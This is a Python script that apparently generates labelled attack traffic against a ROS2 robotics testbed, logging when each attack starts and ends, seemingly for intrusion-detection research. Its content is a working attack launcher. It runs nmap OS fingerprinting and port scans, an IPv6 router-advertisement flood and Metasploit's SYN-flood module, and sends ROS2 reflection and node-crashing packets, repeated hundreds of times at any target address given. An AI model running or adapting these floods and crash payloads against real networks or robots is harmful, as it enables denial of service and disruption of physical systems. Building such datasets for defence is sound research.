#!/usr/bin/env python3
from ROS.attacks import *
from pymetasploit3.msfrpc import MsfRpcClient
import argparse
import socket
from datetime import datetime as dt
from datetime import timedelta
from subprocess import run
from shlex import split
from time import sleep
import signal


def signal_handler(sig, frame):
    print(color("\nCtrl+C pressed, exiting", fg="red"))
    if 'job' in globals():
        msfclient.jobs.stop(job['job_id'])
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description="Launches attacks on SPaCe. "
                                 "May need root privileges to run")

parser.add_argument('-t', '--target', metavar='ADDRESS', type=validate_ip,
                    help='the IP address of the target of the attacks. '
                        'It\'s required unless -n|--not-execute is passed.')
parser.add_argument('-s', '--source',metavar='ADDRESS',
                    type=validate_ip,
                    help='the IP address to be used as the source address of '
                    'sent packets. It\'s required unless -n|--not-execute is passed.')
parser.add_argument('-c', '--count', metavar='NUMBER', type=int, required=False,
                    help='the number of launches for each attack that '
                        'doens\'t requires a RESET. Defaults to 1000.',
                    default=1000)
parser.add_argument('-cr', '--count-reset', metavar='NUMBER', type=int, required=False,
                    help='the number of launches for each attack that requires a RESET. Defaults to the same value as count.',
                    default=500)
parser.add_argument('-cp', '--count-portscan', metavar='NUMBER', type=int, required=False,
                    help='the number of launches for the portscan attack. Defaults to the same value as count.',
                    default=500)
parser.add_argument('-C', '--total-count', metavar='NUMBER', type=int, required=False,
                    help='the number of complete rounds during which all attacks are performed. Defaults to 1.',
                    default=1)
parser.add_argument('-d', '--delay', metavar='SECONDS', type=int, required=False,
                    help='the delay in seconds before an attack is attempted '
                    'after a previous attack (only used when --count > 1).\n'
                    'Defaults to 0', default=0)
parser.add_argument('-dr', '--delay-reset', metavar='SECONDS', type=int, required=False,
                    help='the delay in seconds before an attack is attempted '
                    'after a previous attack that required a RESET.\n'
                    'Defaults to 90', default=90)
parser.add_argument('-r', '--starting-delay', metavar='SECONDS', type=int, required=False,
                    help='the delay in seconds between groups of attacks.'
                    ' Defaults to 0', default=0)
parser.add_argument('-l', '--flood-duration', metavar='SECONDS', type=int, required=False,
                    help='the duration in seconds of the SYN flood attack '
                    'performed by Metasploit and RA flood attack performed by NMAP.'
                    '\nDefaults to 60', default=60)
parser.add_argument('-p', '--reset-port', metavar='NUMBER', type=int, required=False,
                    default=65535,
                    help='the port where to send the reset commands to ask the '
                    'target to prepare for a new round of tests cleanly.\n'
                    'Defaults to 65535')
parser.add_argument('-T', '--timeout', metavar='SECONDS', type=int, required=False,
                    default=20,
                    help='number of seconds to wait if a network error occurs before retrying.\n'
                    'Defaults to 20')
parser.add_argument('-R','--retry-count', metavar='NUMBER', type=int, required=False, 
                    default=5,
                    help='number of attempts to retry an attack if a network '
                    'error occurs before passing to the next attack.\n'
                    'Defaults to 5')
parser.add_argument('-f', '--log-file', metavar='PATH', type=str,
                    help='the file to which timestamps of attacks start and '
                    'endings will be saved.\nDefaults to "attacks_log.csv".\n'
                    'File will be created if it not exist, '
                    'and overwritten if it exist.',
                    required=False, default='attacks_log.csv')
parser.add_argument('-P', '--msf-password', metavar='PASSWORD', type=str,
                    help='the password to connect to the metasploit daemon.\n'
                    'Defaults to "pentest"',
                    required=False, default='pentest')
parser.add_argument('-n', '--not-execute', action='store_true', default=False,
                    help='doesn\'t perform any attack, but calculate only the '
                    'duration estimate based on run counts and delays')

args = parser.parse_args()

dst = args.target
src = args.source

_delay = 0
if args.count > 1:
    _delay = args.delay

if args.count_reset < 0:
    args.count_reset = args.count

if args.count_portscan < 0:
    args.count_portscan = args.count

_delay_reset = 0
if args.delay_reset > 0:
    _delay_reset = args.delay_reset

scanning_manual_estimate = 120

nmap_discovery = (3 + args.delay) * args.count
nmap_port_scaning = (scanning_manual_estimate + args.delay) * args.count_portscan
ros2_recon = (3 + args.delay) * args.count
ros2_node_crash = (3 + _delay_reset) * args.count_reset
ros2_reflection = (3 + _delay_reset) * args.count_reset
nmap_flooding = (args.flood_duration + _delay_reset) * args.count_reset
metasploit_flooding = (args.flood_duration + _delay_reset) * args.count_reset

time_estimate = (
     nmap_discovery +  # nmap discovery
     nmap_port_scaning+  # nmap port scanning
     ros2_recon +  # ros2 reconnainssance
     ros2_node_crash +  # ros2 node crashing 
     ros2_reflection+  # ros2 reflection
     nmap_flooding +  # nmap flooding
     metasploit_flooding  # metasploit flooding
) * args.total_count

if args.not_execute:
    print(color(f"\nEstimated campaign duration: {timedelta(seconds=time_estimate)}",fg="yellow"))
    print('divided in (in order of execution):')
    print(f'  NMAP DISCOVERY\t{args.count} times with {_delay} seconds delay\t-> {timedelta(seconds=nmap_discovery)}')
    print(f'  NMAP PORT SCANNING\t{args.count_portscan} times with {_delay} seconds delay\t-> {timedelta(seconds=nmap_port_scaning)}')
    print(f'  ROS2 RECONNAISSANCE\t{args.count} times with {_delay} seconds delay\t-> {timedelta(seconds=ros2_recon)}')
    print(f'  ROS2 NODE CRASHING\t{args.count_reset} times with {_delay_reset} seconds delay\t-> {timedelta(seconds=ros2_node_crash)}')
    print(f'  ROS2 REFLECTION\t{args.count_reset} times with {_delay_reset} seconds delay\t-> {timedelta(seconds=ros2_reflection)}')
    print(f'  NMAP FLOODING\t\t{args.count_reset} times with {_delay_reset} seconds delay\t-> {timedelta(seconds=nmap_flooding)}')
    print(f'  METASPLOIT FLOODING\t{args.count_reset} times with {_delay_reset} seconds delay\t-> {timedelta(seconds=metasploit_flooding)}')
    print(f'  with a flooding duration of {args.flood_duration} seconds')
    print(color('just a duration estimate was requested, exiting without performing any attack', fg='yellow'))
    sys.exit(0)
else:
    if not (args.target and args.source):
        parser.error('you must specify both target and source IP addresses when not passing -n|--not-execute option')

print(color(f"\nEstimated campaign duration: {timedelta(seconds=time_estimate)}", fg="yellow"))

# setup 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
log = open(args.log_file, 'w+')
log.write('timestamp,attack,event\n')
log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},campaign,start\n")
msfclient = MsfRpcClient(args.msf_password, ssl=False)


def convert_ip(ipv4):
    if ipv4 == '127.0.0.1':
        return '::1'
    return '2002:{:02x}{:02x}:{:02x}{:02x}::'.format(*map(int, ipv4.split('.')))


def send_wrapper(msg):
    handle_network_errors(lambda: sock.sendto(msg.encode(), (dst, args.reset_port)))


def start_attack(atk_id):
    global attack_id
    attack_id = atk_id
    print(f"starting {attack_id}")
    log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},{attack_id},start\n")


def end_attack():
    log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},{attack_id},end\n")
    print(f"{attack_id} ended")


def end_campaign():
    send_wrapper('END')
    #log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},{attack_id},end\n")
    log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},campaign,end\n")
    print(f"campaign ended")


def ensure_madness_writes():
    send_wrapper('FLUSH')
    log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},restart madness and flush output signal,sent\n")
    print(f"sent signal FLUSH to restart madness experiment and flush output")



def launch(name, command, reset=False, count=None):
    sleep(args.starting_delay)
    delay = _delay_reset if reset else _delay
    _count = args.count_reset if reset else args.count
    _count = _count if count is None else count
    for _ in range(_count):
        sleep(delay)
        start_attack(name)
        handle_network_errors(command)
        end_attack()
        if reset:
            send_wrapper('RESET')
    if _count > 0:
        ensure_madness_writes()


def launch_portscan():
    sleep(args.starting_delay)
    for _ in range(args.count_portscan):
        sleep(_delay)
        start_attack('nmap port scanning')
        command = f'nmap --privileged -sNV {dst} --exclude-ports {args.reset_port}'  # TCP null scan & version detection
        handle_network_errors(lambda: run(split(command)))
        command = f'nmap --privileged -sA {dst} --exclude-ports {args.reset_port}'  # TCP ACK scann
        handle_network_errors(lambda: run(split(command)))
        command = f'nmap --privileged -sU {dst} -p 7400-7500'  # UDP scan
        handle_network_errors(lambda: run(split(command)))
        end_attack()
    if args.count_portscan > 0:
        ensure_madness_writes()


def handle_network_errors(command):
    done = False
    retry = args.retry_count
    while not done and retry > 0:
        try:
            command()
            done = True
        except OSError as e:
            print(e)
            log.write(f"{dt.now().strftime('%a %b %d %H:%M:%S CEST 2023')},network error,{str(e)}\n")
            done = False
            retry -= 1
            sleep(args.timeout)


def syn_flood():
    flood = msfclient.modules.use('auxiliary', 'dos/tcp/synflood')
    flood['RHOSTS'] = dst
    global job
    job = flood.execute()
    print('performing SYN flood...', end='')
    sleep(args.flood_duration)
    msfclient.jobs.stop(job['job_id'])
    print('done')


try:
    for _ in range(args.total_count):
        # discovery NMAP
        command = f'nmap --privileged -O --osscan-guess {dst} --exclude-ports {args.reset_port}'  # aggressively tries to guess os
        launch('nmap discovery', lambda: run(split(command)))

        # nmap port scanning
        launch_portscan()

        try:
            # discovery ROS2
            launch('ros2 reconnaissance', lambda: sr1(get_footprint(src, dst), retry=0, timeout=10))

            # NMAP SYN flood
            send_wrapper('RESET')
            command = f'nmap --privileged -6 {convert_ip(dst)} --script ipv6-ra-flood.nse --script-args "interface=enx34d0b8c21625"'
            launch('nmap SYN flood', lambda: run(split(command)), reset=True)

            # ROS2 reflection attack
            launch('ros2 reflection', lambda: send(get_reflection(dst)), reset=True)

            # ROS2 node crashing
            launch('ros2 node crashing', lambda: send(get_crasher(dst)), reset=True)
        except PermissionError:
            print(color('unable to perform attacks operation due to lack of permissions!',
                fg='red'), file=sys.stderr)
            print('This script needs permission to bind to network interfaces to capture'
                ' packets and to bind to reserved ports.')
            print('One way to achieve this is by running it as root (with sudo).')

        # SYN flood metasploit
        launch('metasploit SYN flood', lambda: syn_flood(), reset=True)
    end_campaign()

finally:
    sock.close()
    log.close()
